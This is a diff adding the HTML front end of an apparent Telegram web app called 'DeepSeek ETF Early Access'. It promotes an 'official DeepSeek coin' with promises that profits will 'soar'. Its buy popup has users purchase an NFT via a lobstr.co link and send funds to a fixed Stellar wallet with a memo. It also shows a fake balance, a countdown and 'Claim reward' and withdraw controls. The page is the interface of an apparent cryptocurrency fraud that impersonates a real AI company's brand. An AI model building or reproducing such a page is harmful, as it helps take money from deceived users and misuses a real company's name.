@@ -1,0 +1,205 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+
+    <!--Styles -->
+    <link rel="stylesheet" href="styles/HomeSectionStyle.css">
+    <link rel="stylesheet" href="styles/WalletSectionStyle.css">
+    <link rel="stylesheet" href="Modular/Popups/ErrorPopUpStyle.css">
+    <link rel="stylesheet" href="Modular/Popups/CommonPopup.css">
+    <link rel="stylesheet" href="Modular/Popups/RechargePopupStyle.css">
+
+    <title>DeepSeek ETF Early Access</title>
+</head>
+<body>
+<div class="container">
+
+    <!-- Home Section -->
+    <div id="home-content" class="home-section">
+        <div class="header">
+            <img src="content/deepdeek_logo.png" alt="Logo Icon" class="logo-icon">
+        </div>
+
+        <main class="main-content">
+            <h1> DeepSeek Early Access </h1>
+            <p class="description">
+                The official DeepSeek coin is gearing up for listing!
+                Don’t miss the chance to buy it at a great price before it skyrockets.
+                Get in now and watch your profits soar! 🚀
+            </p>
+            <div class="balance">
+                <h2 class="balance-value">$0.00</h2>
+                <p class="balance-tokens">Tokens: 0</p>
+            </div>
+
+            <div class="buttons">
+                <div class="btn-wrapper">
+                    <button class="btn buy" onclick="openRechargePopup()">
+                        <div class="btn-background buy">
+                            <svg class="btn-icon" version="1.0" xmlns="http://www.w3.org/2000/svg"
+                                 width="40" height="40" viewBox="0 0 128.000000 128.000000"
+                                 preserveAspectRatio="xMidYMid meet">
+                                <g transform="translate(0.000000,128.000000) scale(0.100000,-0.100000)"
+                                   fill="currentColor" stroke="none">
+                                    <path d="M175 1026 c-61 -28 -95 -85 -95 -162 l0 -44 561 0 561 0 -4 60 c-5 64 -22 98 -72 134 -27 20 -40 21 -474 23 -357 2 -453 0 -477 -11z"/>
+                                    <path d="M82 541 c3 -219 5 -226 72 -275 27 -21 38 -21 486 -21 448 0 459 0 486 21 67 49 69 56 72 275 l3 199 -561 0 -561 0 3 -199z m352 -83 c8 -13 8 -23 0 -35 -9 -14 -28 -19 -88 -21 -81 -3 -106 6 -106 37 0 34 22 42 104 39 62 -2 81 -7 90 -20z m160 0 c17 -28 -5 -52 -48 -56 -56 -5 -87 33 -54 66 18 18 89 11 102 -10z"/>
+                                </g>
+                            </svg>
+                        </div>
+                        <p>Buy</p>
+                    </button>
+                </div>
+
+                <div class="btn-wrapper">
+                    <button class="btn link" onclick="openWebPage()">
+                        <div class="btn-background link">
+                            <svg class="btn-icon" version="1.0" xmlns="http://www.w3.org/2000/svg"
+                                 width="40" height="40" viewBox="0 0 128.000000 128.000000"
+                                 preserveAspectRatio="xMidYMid meet">
+                                <g transform="translate(0.000000,128.000000) scale(0.100000,-0.100000)"
+                                   fill="currentColor" stroke="none">
+                                    <path d="M610 910 c-283 -109 -519 -205 -524 -213 -19 -30 4 -45 140 -91 75 -25 140 -44 143 -42 3 2 140 85 304 185 164 100 303 181 308 179 8 -3 -299 -293 -431 -408 -27 -24 -29 -31 -38 -145 -5 -75 -5 -125 1 -132 7 -9 30 7 90 61 l80 74 139 -106 c136 -104 140 -106 166 -92 24 14 30 36 119 435 51 231 93 428 93 438 0 22 -35 57 -57 56 -10 0 -250 -90 -533 -199z"/>
+                                </g>
+                            </svg>
+                        </div>
+                        <p>Link</p>
+                    </button>
+                </div>
+            </div>
+
+            <div class="countdown">
+                <div class="time-block">
+                    <span>00</span>
+                    <p>Days</p>
+                </div>
+                <div class="time-block">
+                    <span>00</span>
+                    <p>Hours</p>
+                </div>
+                <div class="time-block">
+                    <span>00</span>
+                    <p>Minutes</p>
+                </div>
+                <div class="time-block">
+                    <span>00</span>
+                    <p>Seconds</p>
+                </div>
+            </div>
+
+            <button class="btn reward" onclick="openWithdrawPopup()">Claim reward</button>
+        </main>
+    </div>
+
+    <!-- Wallet Section -->
+    <div id="wallet-content" class="wallet-section hidden">
+        <button class="add-wallet-btn" onclick="openWalletPopup()">+ Add Wallet</button>
+
+        <div class="divider-line"> </div>
+        <div class="wallet-list"> </div>
+    </div>
+
+    <!-- Transaction Section -->
+    <div id="transaction-content" class="transaction-section hidden"> </div>
+
+    <!-- History Section -->
+    <div id="history-content" class="history-section hidden"> </div>
+
+    <!-- Footer -->
+    <footer class="footer">
+        <div class="nav-item home active" onclick="setActiveTab(this)">
+            <img src="content/home.png" alt="Home" class="nav-icon">
+        </div>
+        <div class="nav-item wallet" onclick="setActiveTab(this)">
+            <img src="content/wallet.png" alt="Wallet" class="nav-icon">
+        </div>
+        <div class="nav-item transaction" onclick="setActiveTab(this)">
+            <img src="content/transaction.png" alt="Transaction" class="nav-icon">
+        </div>
+        <div class="nav-item history" onclick="setActiveTab(this)">
+            <img src="content/history.png" alt="History" class="nav-icon">
+        </div>
+    </footer>
+
+    <!-- Buy Popup -->
+    <div id="recharge-popup" class="cp_popup" onclick="closePopup()">
+        <div class="cp_popup-content" onclick="event.stopPropagation()">
+            <p class="instructions-text">Follow the instructions to deposit funds:</p>
+            <ol class="recharge-steps">
+                <li>
+                    <p>You need to buy NFT asset on the following link:</p>
+                    <div class="copy-section">
+                        <strong>URL:</strong>
+                        <p><span id="link-address-popup" class="link-address-popup">https://lobstr.co/trade/NFT:GBBWC7PI3LX4GNQ2AMF3HOHJCTHFWSIADMCB2DZIRNM6IKIVRTXMJTRG</span></p>
+                        <button class="copy-button" onclick="openWebPage('link-address-popup')">OPEN</button>
+                    </div>
+                </li>
+
+                <li>
+                    <p>Transfer funds to the following wallet:</p>
+                    <div class="copy-section">
+                        <strong>Wallet:</strong>
+                        <p><span id="wallet-address-popup"> GC2JTXEMO7WLT4DECCRRZKJXW26RECLSR3FUXADX262OQ6PJEQCJIYM4</span></p>
+                        <button class="copy-button" onclick="copyToClipboard('wallet-address-popup')">COPY</button>
+                    </div>
+                </li>
+
+                <li>
+                    <p>Add the following MEMO to your transfer:</p>
+                    <div class="copy-section">
+                        <strong>MEMO:</strong>
+                        <p><span id="memo-value"></span></p>
+                        <button class="copy-button" onclick="copyToClipboard('memo-value')">COPY</button>
+                    </div>
+                </li>
+
+                <li>
+                    <p>The balance will be updated within 5 minutes.</p>
+                </li>
+            </ol>
+            <p class="important-text"><strong>IMPORTANT:</strong> Ensure the MEMO matches exactly to avoid losing your funds.</p>
+            <button class="ok-button" onclick="closePopup()">OK</button>
+        </div>
+    </div>
+
+    <!-- Withdraw Popup -->
+    <div id="withdraw-popup" class="cp_popup" onclick="closePopup()">
+        <div class="cp_popup-content" onclick="event.stopPropagation()">
+            <h2 id="withdraw-title" class="cp_popup-title">Withdraw Funds</h2>
+            <div class="cp_popup-input-wrapper">
+                <input id="withdraw-input" class="cp_popup-input" type="number" placeholder="Enter amount">
+                <span class="cp_popup-currency">$</span>
+            </div>
+            <button id="withdraw-confirm-button" class="cp_popup-button">Confirm</button>
+        </div>
+    </div>
+
+    <!-- Add wallet Popup -->
+    <div id="wallet-popup" class="cp_popup" onclick="closePopup()">
+        <div class="cp_popup-content" onclick="event.stopPropagation()">
+            <h2 id="wallet-title" class="cp_popup-title">Add Wallet</h2>
+            <div class="cp_popup-input-wrapper">
+                <input id="wallet-input" class="cp_popup-input" type="text" placeholder="Enter wallet address...">
+            </div>
+            <button id="wallet-confirm-button" class="cp_popup-button" onclick="addWallet()">Add Wallet</button>
+        </div>
+    </div>
+
+    <!-- Error Popup -->
+    <div id="epus-error-popup" class="epus-error-popup-overlay">
+        <div class="epus-error-popup-content">
+            <h2 id="epus-error-title" class="epus-error-title">Warning</h2>
+            <p id="epus-error-message" class="epus-error-message">Something went wrong. Please try again.</p>
+            <button id="epus-close-error-popup-button" class="epus-close-error-popup-button">Close</button>
+        </div>
+    </div>
+</div>
+
+<div id="toast-notification" class="toast"></div>
+
+<script type="module" src="js/main.js"></script>
+<script type="module" src="Modular/Popups/PopupAdapter.js"></script>
+</body>
+</html>
